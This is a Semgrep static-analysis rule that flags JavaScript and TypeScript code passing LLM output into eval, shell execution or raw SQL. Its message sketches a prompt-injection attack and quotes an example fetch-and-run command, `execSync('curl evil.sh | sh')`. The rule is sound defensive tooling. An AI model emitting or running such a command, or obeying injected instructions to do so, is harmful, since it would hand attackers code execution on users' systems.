rules:
  - id: js-llm-output-to-dangerous-sink
    languages: [javascript, typescript]
    severity: ERROR
    message: >-
      Text generated by an LLM is executed as code, a shell command, or SQL. Model output is
      attacker-influenced: a prompt injection hidden in a document, web page, or user message can
      make the model emit `require('child_process').execSync('curl evil.sh | sh')` or destructive
      SQL. Treat model output as untrusted input: validate it into a constrained structure (a zod
      schema, an enum of allowed actions), run code only in an isolated sandbox, and use
      parameterized SQL.
    metadata:
      title: LLM output reaches code execution, shell, or SQL
      cwe:
        - "CWE-94: Improper Control of Generation of Code ('Code Injection')"
        - "CWE-78: Improper Neutralization of Special Elements used in an OS Command"
      owasp:
        - "A03:2021 - Injection"
        - "LLM05:2025 - Improper Output Handling"
      confidence: medium
    mode: taint
    pattern-sources:
      - pattern: $CLIENT.messages.create(...)
      - pattern: $CLIENT.chat.completions.create(...)
      - pattern: $CLIENT.responses.create(...)
      - pattern: $MODEL.generateContent(...)
      - pattern: $CHAIN.invoke(...)
      - pattern: generateText(...)
      - pattern: generateObject(...)
    pattern-sanitizers:
      - pattern-either:
          - pattern: $SCHEMA.parse(...)
          - pattern: $SCHEMA.safeParse(...)
          - pattern: Number(...)
          - pattern: parseInt(...)
    pattern-sinks:
      - patterns:
          - pattern-either:
              - pattern: eval($X)
              - pattern: new Function(..., $X)
              - pattern: vm.runInNewContext($X, ...)
              - pattern: vm.runInThisContext($X, ...)
              - pattern: vm.runInContext($X, ...)
              - pattern: exec($X, ...)
              - pattern: execSync($X, ...)
              - pattern: '$CP.spawn($X, ..., {..., shell: true, ...})'
              # `$CP.exec` alone would also match RegExp.prototype.exec.
              - patterns:
                  - pattern-either:
                      - pattern: $CP.exec($X, ...)
                      - pattern: $CP.execSync($X, ...)
                  - metavariable-regex:
                      metavariable: $CP
                      regex: (?i)^(child_?process|cp|proc|childProcess)$
              # `const run = promisify(exec)` / `util.promisify(cp.exec)`.
              - patterns:
                  - pattern-inside: |
                      $RUN = $U(<... $E ...>);
                      ...
                  - pattern: $RUN($X, ...)
                  - metavariable-regex:
                      metavariable: $U
                      regex: ^(promisify|util\.promisify)$
                  - metavariable-regex:
                      metavariable: $E
                      regex: ^(exec|execSync|(child_?process|cp|childProcess)\.exec)$
              - pattern: $DB.query($X, ...)
              - pattern: $DB.$queryRawUnsafe($X, ...)
              - pattern: $DB.$executeRawUnsafe($X, ...)
              - pattern: $DB.raw($X, ...)
          - focus-metavariable: $X
